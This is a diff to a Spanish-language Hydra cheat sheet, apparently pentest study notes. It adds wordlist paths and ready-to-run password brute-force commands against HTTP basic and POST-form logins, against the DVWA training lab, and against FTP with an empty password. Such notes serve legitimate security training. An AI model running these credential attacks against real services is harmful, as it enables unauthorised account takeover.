@@ -27,9 +27,11 @@ Es una herramienta de prueba de penetración que se utiliza para realizar ataque
 
 # Directorios 'Users'
 ❯ /usr/share/Seclists/Usernames/xato-net-10-million-usernames.txt
+❯ /usr/share/Seclists/Usernames/top-usernames-shortlist.txt 
 ❯ /usr/share/metasploit-framework/data/wordlists/unix_users.txt
 ❯ /usr/share/wordlists/metasploit/unix_users.txt
 ❯ /usr/share/wordlists/metasploit/common_users.txt
+
 ```
 
 ## Fuerza bruta a una autenticación digital 
@@ -37,8 +39,27 @@ Es una herramienta de prueba de penetración que se utiliza para realizar ataque
 ```bash 
 ❯ hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-get /DIR/ 
 
-	# IP = Direccion IP del servidor que contiene la autenticacion que solicita user/passwd para acceder a la pagina
-	# DIR = Ruta que contiene la autenticacion 
+	# IP = Dirección IP del servidor que contiene la autenticación
+	# DIR = Ruta donde se encuentra el login de autenticación
+
+```
+
+```bash 
+❯ hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/admin/:user=^USER^&pass=^PASS^:F=Username or password invalid" -V -I -t 4   
+
+	# /admin = Ruta donde se encuentra el login de autenticación
+```
+
+## Fuerza bruta a DVWA
+
+```bash 
+❯ hydra -l admin -P /usr/share/wordlists/john.lst 'http-get-form://IP:8080/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=aaabbbccc; security=low:F=Username and/or password incorrect'
+
+❯ hydra -l admin -P /usr/share/wordlists/john.lst 'http-get-form://IP:8080/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=aaabbbccc; security=medium:F=Username and/or password incorrect' -V -I 
+
+Nota: 
+	1. Los datos salen del 'Inspector > Network' y es la ruta donde se encuentra el login de autenticación
+	2. La cookie sale en 'Inspector > Storage'
 ```
 
 ## Fuerza bruta a un CMS
@@ -106,7 +127,7 @@ Es una herramienta de prueba de penetración que se utiliza para realizar ataque
 ## Hydra fuerza bruta FTP
 
 ```ruby
-❯ hydra -L Usernames.txt -P Passwords.txt ❮IP❯ ftp   # Fuerza bruta al puerto 21 'FTP'
+❯ hydra -L Usernames.txt -p ' ' ❮IP❯ ftp      # Fuerza bruta al puerto 21 'FTP' sin colocar password 
 
 ❯ hydra -l omar -P /usr/share/wordlists/rockyou.txt ftp://❮IP❯ -t 15 
 
